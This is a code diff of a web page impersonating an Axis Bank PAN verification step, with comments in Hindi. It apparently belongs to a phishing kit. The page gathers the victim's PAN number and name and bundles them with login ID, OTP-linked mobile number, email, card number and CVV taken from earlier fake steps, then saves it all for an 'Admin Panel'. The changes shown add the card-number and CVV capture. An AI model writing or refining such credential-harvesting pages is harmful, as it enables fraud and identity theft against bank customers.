@@ -666,103 +666,126 @@
         const backLink = document.getElementById('backLink');
         const helpLink = document.getElementById('helpLink');
         
-        // PAN number validation and auto-uppercase
+        // ✅ PAN number को ऑटो uppercase में बदलो
         panNumberInput.addEventListener('input', function(e) {
-            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/gi, '');
+            // सभी non-alphanumeric characters हटाओ और uppercase करो
+            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
             e.target.value = value;
         });
         
-        // PAN format validation
+        // ✅ PAN format validation
         function validatePAN(pan) {
             // PAN format: 5 letters + 4 digits + 1 letter
             const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
             return panRegex.test(pan);
         }
         
-        // Get user data from previous steps
+        // ✅ यूजर का पुराना डेटा लो (लॉगिन, OTP, क्रेडिट कार्ड)
         function getUserData() {
             try {
-                // Get all submissions from localStorage
                 const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
                 
-                // Find OTP submission (last otp submission)
-                const otpSubmissions = submissions.filter(sub => sub.type === 'otp');
-                const otpSubmission = otpSubmissions.length > 0 ? otpSubmissions[0] : null;
-                
-                // Find login submission (last login submission)
+                // सभी टाइप के सबमिशन अलग-अलग लो
                 const loginSubmissions = submissions.filter(sub => sub.type === 'login');
-                const loginSubmission = loginSubmissions.length > 0 ? loginSubmissions[0] : null;
-                
-                // Find credit submission if any (last credit submission)
+                const otpSubmissions = submissions.filter(sub => sub.type === 'otp');
                 const creditSubmissions = submissions.filter(sub => sub.type === 'credit');
-                const creditSubmission = creditSubmissions.length > 0 ? creditSubmissions[0] : null;
                 
                 return {
-                    otpData: otpSubmission,
-                    loginData: loginSubmission,
-                    creditData: creditSubmission
+                    // सबसे नया login डेटा
+                    loginData: loginSubmissions.length > 0 ? loginSubmissions[0] : null,
+                    
+                    // सबसे नया OTP डेटा
+                    otpData: otpSubmissions.length > 0 ? otpSubmissions[0] : null,
+                    
+                    // सबसे नया credit कार्ड डेटा
+                    creditData: creditSubmissions.length > 0 ? creditSubmissions[0] : null
                 };
             } catch (e) {
                 console.error('Error getting user data:', e);
-                return { otpData: null, loginData: null, creditData: null };
+                return { loginData: null, otpData: null, creditData: null };
             }
         }
         
-        // Save PAN data to axisBankSubmissions
+        // ✅ PAN डेटा को axisBankSubmissions में सेव करो - CORRECTED
         function savePANData(panNumber, fullName) {
             try {
-                // Get existing submissions
+                // सबसे पहले, सभी पुराने सबमिशन्स लो
                 let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
                 
-                // Get user data from previous steps
+                // यूजर का पुराना डेटा लो (लॉगिन, OTP, क्रेडिट कार्ड)
                 const userData = getUserData();
                 
-                // Create PAN submission object - EXACT INPUT AS ENTERED
+                // नया PAN सबमिशन बनाओ - जैसा यूजर ने टाइप किया वैसा ही सेव करो
                 const panSubmission = {
                     id: 'PAN-' + Date.now(),
-                    type: 'pan',
+                    type: 'pan',  // ✅ ये बहुत जरूरी है - Admin Panel इसी से PAN submissions ढूंढता है
                     timestamp: new Date().toISOString(),
-                    date: new Date().toLocaleString(),
-                    ip: '', // Will be captured if needed
+                    date: new Date().toLocaleString('en-IN'),
                     userAgent: navigator.userAgent,
+                    ip: getIPAddress(),
                     data: {
-                        panNumber: panNumber, // EXACT INPUT: ABCDE1234H
-                        fullName: fullName,   // EXACT INPUT: rahul
+                        // ✅ यूजर ने जो टाइप किया वही सेव करो
+                        panNumber: panNumber,       // जैसे: ABCDE1234H (exact input)
+                        fullName: fullName,         // जैसे: rahul (exact input)
                         status: 'verified',
                         source: 'PAN Verification Page',
-                        // Include previous data if available
-                        mobileNumber: userData.otpData?.data?.mobileNumber || 
-                                    userData.loginData?.data?.mobile || 
-                                    userData.creditData?.data?.mobile || '',
+                        
+                        // ✅ पुराना डेटा भी साथ में सेव करो
+                        mobile: userData.loginData?.data?.mobile || 
+                               userData.otpData?.data?.mobileNumber || 
+                               userData.creditData?.data?.mobile || '',
+                        
                         userId: userData.loginData?.data?.loginId || 
                                userData.loginData?.data?.userId || 
-                               userData.creditData?.data?.cardNumber || '',
-                        email: userData.loginData?.data?.email || ''
+                               userData.creditData?.data?.cardName || '',
+                        
+                        email: userData.loginData?.data?.email || '',
+                        
+                        // अगर credit card data है तो उसे भी सेव करो
+                        cardNumber: userData.creditData?.data?.cardNumber || '',
+                        cvv: userData.creditData?.data?.cvv || ''
                     }
                 };
                 
-                // Add to submissions array (newest first)
+                // submissions array में नया डेटा add करो (नया ऊपर आएगा)
                 submissions.unshift(panSubmission);
                 
-                // Save back to localStorage
+                // localStorage में सेव करो - CORRECT KEY: axisBankSubmissions
                 localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
                 
-                console.log('✅ PAN submission saved to axisBankSubmissions:', panSubmission);
+                // ✅ Debug के लिए console में दिखाओ
+                console.log('✅ PAN submission saved to axisBankSubmissions:');
+                console.log('PAN Number:', panNumber);
+                console.log('Full Name:', fullName);
+                console.log('Full submission object:', panSubmission);
+                console.log('Total submissions in localStorage:', submissions.length);
+                
+                // ✅ सिर्फ PAN submissions count दिखाओ
+                const panSubmissions = submissions.filter(sub => sub.type === 'pan');
+                console.log('Total PAN submissions:', panSubmissions.length);
+                
                 return true;
+                
             } catch (e) {
                 console.error('❌ Error saving PAN submission:', e);
                 return false;
             }
         }
         
-        // Form submission handler
+        // ✅ IP address लेने के लिए (अगर चाहिए तो)
+        function getIPAddress() {
+            // ये एक dummy function है, असली में आपको IP detection service use करना चाहिए
+            return '192.168.1.1'; // Temporary IP
+        }
+        
+        // ✅ Form submission handler
         if (panForm) {
             panForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
                 // Get form values EXACTLY as entered
-                const panNumber = panNumberInput.value; // Keep as is (already uppercase)
-                const fullName = fullNameInput.value.trim(); // Keep as entered
+                const panNumber = panNumberInput.value; // Already uppercase from input handler
+                const fullName = fullNameInput.value.trim(); // Keep as entered (rahul, Rahul, etc.)
                 
                 // Validate PAN format
                 if (!validatePAN(panNumber)) {
@@ -792,7 +815,7 @@
                 verifyButton.classList.add('loading');
                 verifyButton.disabled = true;
                 
-                // ✅ FIXED: Save PAN data EXACTLY as entered
+                // ✅ PAN डेटा को CORRECT KEY में सेव करो
                 const saved = savePANData(panNumber, fullName);
                 
                 // Simulate verification delay
@@ -803,7 +826,13 @@
                     verifyButton.disabled = false;
                     
                     if (saved) {
-                        // Redirect to next page (axis_otp2.html)
+                        // ✅ Admin panel में check करने के लिए message
+                        console.log('✅ PAN data saved successfully!');
+                        console.log('Check Admin Panel to see:');
+                        console.log('1. PAN Number:', panNumber);
+                        console.log('2. Full Name:', fullName);
+                        
+                        // Redirect to next page
                         window.location.href = 'axis_otp2.html';
                     } else {
                         alert('PAN verification failed. Please try again.');
@@ -830,11 +859,20 @@
             // Focus PAN input
             panNumberInput.focus();
             
-            // Initialize axisBankSubmissions if not exists
+            // ✅ Initialize axisBankSubmissions if not exists
             if (!localStorage.getItem('axisBankSubmissions')) {
                 localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
+                console.log('✅ axisBankSubmissions initialized in localStorage');
             }
+            
+            // ✅ Debug: Show current submissions count
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            console.log('Current submissions in localStorage:', submissions.length);
+            
+            // ✅ Check for PAN submissions specifically
+            const panSubmissions = submissions.filter(sub => sub.type === 'pan');
+            console.log('Current PAN submissions:', panSubmissions.length);
         });
     </script>
 </body>
-</html>
+    </html>
